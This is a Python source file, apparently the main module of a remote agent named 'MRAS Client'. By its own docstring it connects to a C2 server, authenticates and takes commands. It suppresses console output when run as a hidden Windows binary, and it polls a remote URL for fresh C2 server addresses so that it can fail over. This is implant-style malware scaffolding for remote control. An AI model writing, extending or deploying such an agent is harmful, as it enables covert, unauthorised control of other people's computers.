"""
MRAS Client — remote agent.
Connects to the C2 server, authenticates, and handles commands.
Supports cross-platform operation and automatic failover.
"""
from __future__ import annotations
import asyncio
import logging
import logging.handlers
import os
import sys
from pathlib import Path

import yaml

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from client.connection import ClientConnection


def load_config() -> dict:
    config_path = Path(__file__).parent / "config.yaml"
    with open(config_path) as f:
        cfg = yaml.safe_load(f)
    cfg["client"]["secret"] = os.environ.get("MRAS_SECRET", cfg["client"]["secret"])
    return cfg


def setup_logging(cfg: dict) -> None:
    lc = cfg["logging"]
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    level = getattr(logging, lc["level"].upper(), logging.INFO)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    fh = logging.handlers.RotatingFileHandler(
        lc["file"], maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
    )
    fh.setFormatter(logging.Formatter(fmt))
    handlers: list[logging.Handler] = [fh]
    # Only attach console handler when not running as a windows noconsole binary
    if sys.stdout and sys.stdout.isatty():
        handlers.append(logging.StreamHandler())
    logging.basicConfig(level=level, format=fmt, handlers=handlers)


async def config_update_loop(cfg: dict) -> None:
    """Periodically fetch an updated server list from a remote URL."""
    url: str = cfg["client"].get("config_update_url", "")
    interval: int = cfg["client"].get("config_update_interval", 300)
    if not url:
        return
    while True:
        await asyncio.sleep(interval)
        try:
            import urllib.request, json
            with urllib.request.urlopen(url, timeout=10) as resp:
                data = json.loads(resp.read())
            servers = data.get("servers", [])
            if servers:
                from client.commands.change_server import _update_servers
                _update_servers(servers)
                logging.getLogger("mras.client").info("Config update applied: %s", servers)
        except Exception as exc:
            logging.getLogger("mras.client").debug("Config update failed: %s", exc)


async def main() -> None:
    cfg = load_config()
    setup_logging(cfg)
    log = logging.getLogger("mras.client")
    log.info("MRAS Client starting")

    conn = ClientConnection(cfg)
    await asyncio.gather(
        conn.run(),
        config_update_loop(cfg),
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
